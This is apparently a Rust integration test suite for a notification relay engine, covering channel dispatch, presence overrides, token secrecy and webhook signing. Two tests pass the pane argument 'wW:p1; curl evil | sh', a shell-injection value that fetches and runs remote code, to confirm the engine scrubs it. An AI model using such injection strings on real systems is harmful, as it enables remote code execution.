//! The engine binary's own behavior, driven end to end.
//!
//! Every test spawns the real binary against a private HOME and its own stub
//! channels, so the dispatch decisions, the rendered event, the pane scrub
//! and the exit-0 edge are pinned against what actually ships rather than
//! against the library the binary happens to call.
//!
//! TWO SEAMS DECIDE WHAT A TEST REACHES. `PNS_CHANNELS_DIR` makes stub
//! executables win, which is what lets a test observe a delivery without a
//! network; leaving it UNSET is the only way to reach the native plugins, so
//! the native cases clear it and stub `terminal-notifier` on PATH or point a
//! channel's URL at the crate's one-shot capture binary instead.

use std::ffi::{OsStr, OsString};
use std::io::Write;
use std::os::unix::ffi::OsStrExt;
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Output};
use std::time::{Duration, Instant};

const ENGINE: &str = env!("CARGO_BIN_EXE_pns");
const CAPTURE: &str = env!("CARGO_BIN_EXE_http-capture");

/// Everything one test owns: a private HOME, its stub channels, and the
/// event files those stubs record into. Removed on drop.
struct Sandbox {
    root: PathBuf,
}

impl Sandbox {
    /// Named for its test, so a failure leaves an identifiable directory and
    /// two tests can never share a path the way a content-keyed name can.
    fn new(name: &str) -> Self {
        let root = std::env::temp_dir().join(format!("pns-dispatch-{}-{name}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(root.join("channels")).expect("sandbox");
        let sandbox = Sandbox { root };
        for channel in ["moshi", "hermes", "macos-banner"] {
            sandbox.stub_channel(
                channel,
                &format!("cat >\"{}/{channel}.event\"", sandbox.display()),
            );
        }
        sandbox
    }

    fn display(&self) -> String {
        self.root.to_string_lossy().into_owned()
    }

    fn path(&self, name: &str) -> PathBuf {
        self.root.join(name)
    }

    /// A recording channel, or any other body: the same shape the bats stubs
    /// wrote, one script per channel name.
    fn stub_channel(&self, channel: &str, body: &str) {
        write_script(
            &self.root.join("channels").join(format!("{channel}.sh")),
            body,
        );
    }

    /// The engine, pointed at the stubs and away from the desk, with every
    /// inherited override cleared so a developer's environment cannot decide
    /// a verdict.
    fn relay(&self) -> Command {
        let mut command = self.bare();
        command
            .env("PNS_CHANNELS_DIR", self.root.join("channels"))
            .env("RELAY_IDLE_SECS", "99999");
        command
    }

    /// The engine with NOTHING pointing it at stubs: the native plugins win.
    fn bare(&self) -> Command {
        let mut command = Command::new(ENGINE);
        command.env("HOME", &self.root);
        for inherited in [
            "PNS_CHANNELS_DIR",
            "PNS_TERMINAL_BUNDLE_ID",
            "PNS_PHONE_MARKER_FILE",
            "RELAY_IDLE_SECS",
            "RELAY_DESK_IDLE_SECS",
            "RELAY_SKIP_PHONE",
            "RELAY_FORCE_PHONE",
            "RELAY_PHONE_ATTENTION",
            "RELAY_MOSHI_VIEWING",
            "RELAY_HERDR_FOCUSED_PANE",
            "RELAY_AUTH_FILE",
            "RELAY_MOSHI_URL",
            "RELAY_HERMES_URL",
            "http_proxy",
            "https_proxy",
            "HTTP_PROXY",
            "HTTPS_PROXY",
            "ALL_PROXY",
            "NO_PROXY",
        ] {
            command.env_remove(inherited);
        }
        command
    }

    fn fired(&self, channel: &str) -> bool {
        self.path(&format!("{channel}.event")).exists()
    }

    fn event(&self, channel: &str) -> String {
        std::fs::read_to_string(self.path(&format!("{channel}.event")))
            .unwrap_or_else(|_| panic!("{channel} recorded no event"))
    }
}

impl Drop for Sandbox {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.root);
    }
}

fn write_script(path: &Path, body: &str) {
    std::fs::write(path, format!("#!/usr/bin/env bash\n{body}\n")).expect("write script");
    std::fs::set_permissions(path, std::os::unix::fs::PermissionsExt::from_mode(0o755))
        .expect("chmod");
}

/// Run to completion, always exit 0: the engine sits on a path where a
/// failed notification must never fail the caller.
fn run(command: &mut Command) -> Output {
    let output = command.output().expect("the engine runs");
    assert!(
        output.status.success(),
        "the engine must exit 0 on every path: {output:?}"
    );
    output
}

fn stdout(output: &Output) -> String {
    String::from_utf8_lossy(&output.stdout).into_owned()
}

fn stderr(output: &Output) -> String {
    String::from_utf8_lossy(&output.stderr).into_owned()
}

/// A JSON field of a compact serde_json object, by exact `"key":"value"`
/// match: the engine writes the object, so the rendering is known and this
/// needs no parser in the test crate.
fn field_is(event: &str, key: &str, value: &str) -> bool {
    event.contains(&format!("\"{key}\":\"{value}\""))
}

// --- the alert path ---------------------------------------------------------

#[test]
fn the_alert_path_reaches_every_channel() {
    let sandbox = Sandbox::new("alert-path");
    run(sandbox
        .relay()
        .args(["--agent", "claude", "--state", "done"])
        .args(["--project", "dotfiles", "--detail", "a summary"]));
    assert!(sandbox.fired("moshi"));
    assert!(sandbox.fired("hermes"));
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn hermes_is_async_on_the_alert_path_so_delivery_stays_off_the_callers_critical_path() {
    let sandbox = Sandbox::new("hermes-async");
    run(sandbox
        .relay()
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(field_is(&sandbox.event("hermes"), "mode", "async"));
}

#[test]
fn a_channel_is_handed_the_rendered_event_not_the_raw_arguments() {
    let sandbox = Sandbox::new("rendered-event");
    run(sandbox
        .relay()
        .args([
            "--agent",
            "claude",
            "--state",
            "done",
            "--project",
            "dotfiles",
        ])
        .args(["--branch", "main", "--detail", "a summary"]));
    let event = sandbox.event("moshi");
    assert!(field_is(&event, "agent", "claude"));
    for rendered in ["title", "message", "preview"] {
        assert!(
            !field_is(&event, rendered, ""),
            "{rendered} must be rendered, not empty: {event}"
        );
    }
}

// --- the narrowing flags ----------------------------------------------------

#[test]
fn local_only_keeps_the_banner_and_reaches_nothing_off_the_machine() {
    let sandbox = Sandbox::new("local-only");
    run(sandbox
        .relay()
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .arg("--local-only"));
    assert!(sandbox.fired("macos-banner"));
    assert!(!sandbox.fired("moshi"));
    assert!(!sandbox.fired("hermes"));
}

#[test]
fn remote_only_delivers_through_hermes_alone() {
    let sandbox = Sandbox::new("remote-only");
    run(sandbox
        .relay()
        .args(["--agent", "weekly", "--state", "done"])
        .args(["--project", "skills", "--detail", "ran", "--remote-only"]));
    assert!(sandbox.fired("hermes"));
    assert!(!sandbox.fired("moshi"));
    assert!(!sandbox.fired("macos-banner"));
}

#[test]
fn hermes_is_sync_on_the_log_path_which_is_what_makes_an_undelivered_entry_visible() {
    let sandbox = Sandbox::new("hermes-sync");
    run(sandbox
        .relay()
        .args(["--agent", "weekly", "--state", "done", "--detail", "ran"])
        .arg("--remote-only"));
    assert!(field_is(&sandbox.event("hermes"), "mode", "sync"));
}

#[test]
fn both_narrowing_flags_together_deliver_nothing_and_say_so() {
    let sandbox = Sandbox::new("both-flags");
    let output = run(sandbox
        .relay()
        .args(["--agent", "x", "--state", "done", "--detail", "y"])
        .args(["--local-only", "--remote-only"]));
    assert!(!sandbox.fired("hermes"));
    assert!(stdout(&output).contains("SKIPPED"), "{output:?}");
}

// --- presence ---------------------------------------------------------------

#[test]
fn at_the_desk_the_phone_is_skipped_and_only_the_phone() {
    let sandbox = Sandbox::new("at-the-desk");
    run(sandbox
        .relay()
        .env("RELAY_IDLE_SECS", "0")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
    assert!(sandbox.fired("hermes"));
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn relay_skip_phone_drops_the_phone_and_only_the_phone() {
    // The caller has already raised the card on the phone through moshi-hook's
    // own round trip, so the push here would be the same event twice; the
    // banner and the paper trail are still wanted.
    let sandbox = Sandbox::new("skip-phone");
    run(sandbox
        .relay()
        .env("RELAY_SKIP_PHONE", "1")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
    assert!(sandbox.fired("hermes"));
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn relay_skip_phone_beats_relay_force_phone() {
    // "I have already sent it" is more specific than a standing override, and
    // the override is the one thing that could reintroduce the double push.
    let sandbox = Sandbox::new("skip-beats-force");
    run(sandbox
        .relay()
        .env("RELAY_IDLE_SECS", "0")
        .env("RELAY_SKIP_PHONE", "1")
        .env("RELAY_FORCE_PHONE", "1")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
}

#[test]
fn relay_force_phone_overrides_presence() {
    let sandbox = Sandbox::new("force-phone");
    run(sandbox
        .relay()
        .env("RELAY_IDLE_SECS", "0")
        .env("RELAY_FORCE_PHONE", "1")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(sandbox.fired("moshi"));
}

// --- a channel's own failures -----------------------------------------------

#[test]
fn a_channel_that_fails_neither_fails_the_caller_nor_suppresses_its_siblings() {
    let sandbox = Sandbox::new("channel-fails");
    sandbox.stub_channel("moshi", "exit 9");
    run(sandbox
        .relay()
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(sandbox.fired("hermes"));
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn an_absent_channel_is_simply_not_installed() {
    let sandbox = Sandbox::new("absent-channel");
    std::fs::remove_file(sandbox.root.join("channels/hermes.sh")).expect("remove the channel");
    run(sandbox
        .relay()
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(sandbox.fired("macos-banner"));
}

// --- the attention override -------------------------------------------------

#[test]
fn phone_attention_in_the_middle_band_sends_the_phone_leg_from_an_at_desk_idle() {
    let sandbox = Sandbox::new("attention-band");
    run(sandbox
        .relay()
        .env("RELAY_IDLE_SECS", "50")
        .env("RELAY_PHONE_ATTENTION", "1")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(sandbox.fired("moshi"));
}

#[test]
fn attention_never_resurrects_a_local_only_phone_leg() {
    let sandbox = Sandbox::new("attention-local-only");
    run(sandbox
        .relay()
        .env("RELAY_IDLE_SECS", "50")
        .env("RELAY_PHONE_ATTENTION", "1")
        .arg("--local-only")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
}

#[test]
fn attention_never_resurrects_a_skip_phoned_leg() {
    let sandbox = Sandbox::new("attention-skip");
    run(sandbox
        .relay()
        .env("RELAY_IDLE_SECS", "50")
        .env("RELAY_PHONE_ATTENTION", "1")
        .env("RELAY_SKIP_PHONE", "1")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
}

#[test]
fn fresh_physical_input_beats_attention_no_phone_leg_under_the_fresh_floor() {
    let sandbox = Sandbox::new("attention-fresh");
    run(sandbox
        .relay()
        .env("RELAY_IDLE_SECS", "5")
        .env("RELAY_PHONE_ATTENTION", "1")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
}

// --- the viewed pane --------------------------------------------------------

#[test]
fn the_watched_panes_card_is_suppressed_other_channels_untouched() {
    let sandbox = Sandbox::new("watched-pane");
    run(sandbox
        .relay()
        .env("RELAY_MOSHI_VIEWING", "1")
        .env("RELAY_HERDR_FOCUSED_PANE", "wW:p1")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "wW:p1"]));
    assert!(!sandbox.fired("moshi"));
    assert!(sandbox.fired("hermes"));
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn a_pane_the_phone_is_not_watching_still_cards() {
    let sandbox = Sandbox::new("other-pane");
    run(sandbox
        .relay()
        .env("RELAY_MOSHI_VIEWING", "1")
        .env("RELAY_HERDR_FOCUSED_PANE", "wW:p2")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "wW:p1"]));
    assert!(sandbox.fired("moshi"));
}

#[test]
fn phone_in_hand_without_moshi_on_screen_still_cards_the_focused_pane() {
    let sandbox = Sandbox::new("phone-in-hand");
    run(sandbox
        .relay()
        .env("RELAY_MOSHI_VIEWING", "0")
        .env("RELAY_HERDR_FOCUSED_PANE", "wW:p1")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "wW:p1"]));
    assert!(sandbox.fired("moshi"));
}

#[test]
fn relay_force_phone_is_caller_intent_and_beats_the_viewed_pane_check() {
    let sandbox = Sandbox::new("force-beats-viewed");
    run(sandbox
        .relay()
        .env("RELAY_FORCE_PHONE", "1")
        .env("RELAY_MOSHI_VIEWING", "1")
        .env("RELAY_HERDR_FOCUSED_PANE", "wW:p1")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "wW:p1"]));
    assert!(sandbox.fired("moshi"));
}

// --- the pane scrub and the exit-0 edge -------------------------------------

#[test]
fn a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event() {
    let sandbox = Sandbox::new("pane-scrub");
    let output = run(sandbox
        .relay()
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "wW:p1; curl evil | sh"]));
    assert!(sandbox.fired("macos-banner"));
    assert!(field_is(&sandbox.event("macos-banner"), "pane", ""));
    assert!(
        stderr(&output).contains("dropped a pane id with shell metacharacters"),
        "{output:?}"
    );
}

#[test]
fn a_scrub_warning_is_not_printed_when_no_channel_will_run() {
    let sandbox = Sandbox::new("scrub-silent");
    let output = run(sandbox
        .relay()
        .args(["--agent", "claude", "--state", "done"])
        .args(["--pane", "wW:p1; curl evil | sh"])
        .args(["--local-only", "--remote-only"]));
    assert!(!stderr(&output).contains("dropped a pane id"), "{output:?}");
}

#[test]
fn a_non_unicode_argument_never_breaks_the_exit_zero_edge() {
    // The engine sits on an always-exit-0 path; a stray byte in argv must
    // degrade like any unknown token, not abort the notification.
    let sandbox = Sandbox::new("non-unicode");
    let output = run(sandbox
        .relay()
        .arg(OsStr::from_bytes(&[0xff]))
        .args(["--local-only", "--remote-only"]));
    assert!(stdout(&output).contains("SKIPPED"), "{output:?}");
}

#[test]
fn the_delivered_event_is_newline_terminated_for_line_oriented_channels() {
    let sandbox = Sandbox::new("newline-terminated");
    sandbox.stub_channel(
        "hermes",
        &format!(
            "set -e\nIFS= read -r event\nprintf %s \"$event\" >\"{}/line.event\"",
            sandbox.display()
        ),
    );
    run(sandbox
        .relay()
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    let line = std::fs::read_to_string(sandbox.path("line.event")).expect("one whole line");
    assert!(field_is(&line, "agent", "claude"), "{line}");
}

// --- the native plugins, which no stub channel can reach --------------------

/// A stub `terminal-notifier` first on PATH, so the native banner's spawn is
/// recorded instead of posting a real notification.
fn with_stub_notifier(sandbox: &Sandbox, command: &mut Command) {
    let stub_bin = sandbox.path("bin");
    std::fs::create_dir_all(&stub_bin).expect("stub bin");
    write_script(
        &stub_bin.join("terminal-notifier"),
        &format!(
            "printf '%s\\n' \"$*\" >\"{}/notifier.args\"",
            sandbox.display()
        ),
    );
    let mut path = OsString::from(stub_bin);
    path.push(":");
    path.push(std::env::var_os("PATH").unwrap_or_default());
    command.env("PATH", path);
}

#[test]
fn the_banner_leg_delivers_natively_and_the_executable_channel_stays_silent() {
    // The one branch the stub-driven tests can never reach: they set
    // PNS_CHANNELS_DIR, the exact condition under which executables win.
    let sandbox = Sandbox::new("native-banner");
    let decoy = sandbox.path(".local/libexec/pns/channels");
    std::fs::create_dir_all(&decoy).expect("decoy dir");
    write_script(
        &decoy.join("macos-banner.sh"),
        &format!("cat >\"{}/decoy.event\"", sandbox.display()),
    );

    let mut command = sandbox.bare();
    command.env("RELAY_IDLE_SECS", "99999");
    with_stub_notifier(&sandbox, &mut command);
    run(command.args([
        "--agent",
        "claude",
        "--state",
        "done",
        "--detail",
        "x",
        "--local-only",
    ]));

    let spawned = std::fs::read_to_string(sandbox.path("notifier.args"))
        .expect("the native banner spawns the notifier");
    assert!(spawned.contains("-title"), "{spawned}");
    assert!(
        !sandbox.path("decoy.event").exists(),
        "the decoy executable channel fired; native did not win"
    );
}

/// The crate's one-shot capture server, already bound: std only, so there is
/// no interpreter cold start to diagnose.
struct Capture {
    server: Child,
    port: u16,
    body_file: PathBuf,
}

impl Capture {
    fn start(sandbox: &Sandbox, name: &str, status: Option<&str>) -> Self {
        let port_file = sandbox.path(&format!("{name}.port"));
        let body_file = sandbox.path(&format!("{name}.capture"));
        let mut command = Command::new(CAPTURE);
        command.arg(&port_file).arg(&body_file);
        if let Some(status) = status {
            command.arg(status);
        }
        let server = command.spawn().expect("the capture server starts");

        let deadline = Instant::now() + Duration::from_secs(30);
        let port = loop {
            if let Ok(text) = std::fs::read_to_string(&port_file)
                && let Ok(port) = text.trim().parse::<u16>()
            {
                break port;
            }
            assert!(Instant::now() < deadline, "the capture server never bound");
            std::thread::sleep(Duration::from_millis(25));
        };
        Capture {
            server,
            port,
            body_file,
        }
    }

    fn url(&self) -> String {
        format!("http://127.0.0.1:{}", self.port)
    }

    /// The raw request, once the server has answered and exited.
    fn finish(mut self) -> String {
        let _ = self.server.wait();
        std::fs::read_to_string(&self.body_file).unwrap_or_default()
    }
}

/// The request body: everything past the blank line that ends the headers.
fn captured_body(raw: &str) -> &str {
    let normalized = raw.find("\r\n\r\n").map(|at| at + 4);
    let plain = raw.find("\n\n").map(|at| at + 2);
    &raw[normalized.or(plain).expect("a header terminator")..]
}

fn captured_header(raw: &str, name: &str) -> Option<String> {
    raw.lines()
        .find(|line| line.to_ascii_lowercase().starts_with(&format!("{name}: ")))
        .map(|line| line[name.len() + 2..].trim().to_string())
}

fn write_auth(sandbox: &Sandbox, contents: &str) -> PathBuf {
    let path = sandbox.path("auth.json");
    let mut file = std::fs::File::create(&path).expect("auth file");
    file.write_all(contents.as_bytes()).expect("write auth");
    path
}

#[test]
fn native_moshi_posts_the_token_in_the_body_and_never_in_the_engines_own_output() {
    let sandbox = Sandbox::new("native-moshi");
    let auth = write_auth(&sandbox, "{\"moshi_secret\":\"tok-integration\"}\n");
    let capture = Capture::start(&sandbox, "moshi", None);

    let mut command = sandbox.bare();
    command
        .env("RELAY_IDLE_SECS", "99999")
        .env("RELAY_AUTH_FILE", &auth)
        .env("RELAY_MOSHI_URL", capture.url());
    with_stub_notifier(&sandbox, &mut command);
    let output = run(command.args(["--agent", "claude", "--state", "done", "--detail", "x"]));

    let raw = capture.finish();
    assert!(
        captured_header(&raw, "content-type")
            .is_some_and(|value| value.eq_ignore_ascii_case("application/json")),
        "the request carried no JSON content type: {raw}"
    );
    let body = captured_body(&raw).trim();
    assert!(
        body.starts_with('{') && body.ends_with('}'),
        "the posted body is not a JSON object: {body}"
    );
    assert!(field_is(body, "token", "tok-integration"), "{body}");
    assert!(body.contains("claude"), "the post carried no title: {body}");

    // The token belongs in the body and NOWHERE else, including here.
    assert!(!stdout(&output).contains("tok-integration"), "{output:?}");
    assert!(!stderr(&output).contains("tok-integration"), "{output:?}");
    assert!(
        stdout(&output).is_empty(),
        "the alert path printed to stdout; async legs must be silent: {output:?}"
    );
}

#[test]
fn a_dead_moshi_endpoint_is_silent_because_the_only_report_would_carry_the_token() {
    let sandbox = Sandbox::new("dead-moshi");
    let auth = write_auth(&sandbox, "{\"moshi_secret\":\"tok-integration\"}\n");
    let mut command = sandbox.bare();
    command
        .env("RELAY_IDLE_SECS", "99999")
        .env("RELAY_AUTH_FILE", &auth)
        .env("RELAY_MOSHI_URL", "http://127.0.0.1:1");
    with_stub_notifier(&sandbox, &mut command);
    let output = run(command.args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(
        stderr(&output).is_empty(),
        "a failed post said something; the failure path must be silent: {output:?}"
    );
}

#[test]
fn sync_hermes_prints_the_posted_line_and_signs_the_exact_bytes_it_sent() {
    let sandbox = Sandbox::new("native-hermes");
    let auth = write_auth(&sandbox, "{\"hermes_secret\":\"gate-signing-key\"}\n");
    let capture = Capture::start(&sandbox, "hermes", None);

    let mut command = sandbox.bare();
    command
        .env("RELAY_AUTH_FILE", &auth)
        .env("RELAY_HERMES_URL", capture.url());
    with_stub_notifier(&sandbox, &mut command);
    let output = run(command
        .args(["--agent", "weekly", "--state", "done", "--detail", "ran"])
        .arg("--remote-only"));

    assert_eq!(stdout(&output).trim_end(), "relay: posted HTTP 200");

    let raw = capture.finish();
    let body = captured_body(&raw);
    let sent = captured_header(&raw, "x-webhook-signature").expect("a signature header");
    // The signature must cover the bytes that were ACTUALLY sent, so it is
    // recomputed over the captured body rather than over a body this test
    // built for itself.
    assert_eq!(
        Some(sent),
        pns::channels::hermes::sign("gate-signing-key", body),
        "the signature does not cover the captured body: {body}"
    );
}

#[test]
fn a_gateway_that_answers_401_is_named_rather_than_read_as_a_downed_gateway() {
    // "No response" would send the operator to restart a healthy gateway
    // instead of rotating the key.
    let sandbox = Sandbox::new("hermes-401");
    let auth = write_auth(&sandbox, "{\"hermes_secret\":\"gate-signing-key\"}\n");
    let capture = Capture::start(&sandbox, "hermes-401", Some("401"));

    let mut command = sandbox.bare();
    command
        .env("RELAY_AUTH_FILE", &auth)
        .env("RELAY_HERMES_URL", capture.url());
    with_stub_notifier(&sandbox, &mut command);
    let output = run(command
        .args(["--agent", "weekly", "--state", "done", "--detail", "ran"])
        .arg("--remote-only"));
    capture.finish();

    assert_eq!(stdout(&output).trim_end(), "relay: post FAILED HTTP 401");
}

#[test]
fn an_async_hermes_with_a_real_key_stays_silent_even_when_the_post_fails() {
    // The alert-path silence check cannot see this: its auth carries no
    // hermes key, so that run returns before any outcome exists.
    let sandbox = Sandbox::new("hermes-async-silent");
    let auth = write_auth(&sandbox, "{\"hermes_secret\":\"gate-signing-key\"}\n");
    let mut command = sandbox.bare();
    command
        .env("RELAY_IDLE_SECS", "99999")
        .env("RELAY_AUTH_FILE", &auth)
        .env("RELAY_HERMES_URL", "http://127.0.0.1:1")
        .env("RELAY_MOSHI_URL", "http://127.0.0.1:1");
    with_stub_notifier(&sandbox, &mut command);
    let output = run(command.args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(
        stdout(&output).is_empty(),
        "an async delivery printed an outcome; async legs must be silent: {output:?}"
    );
}
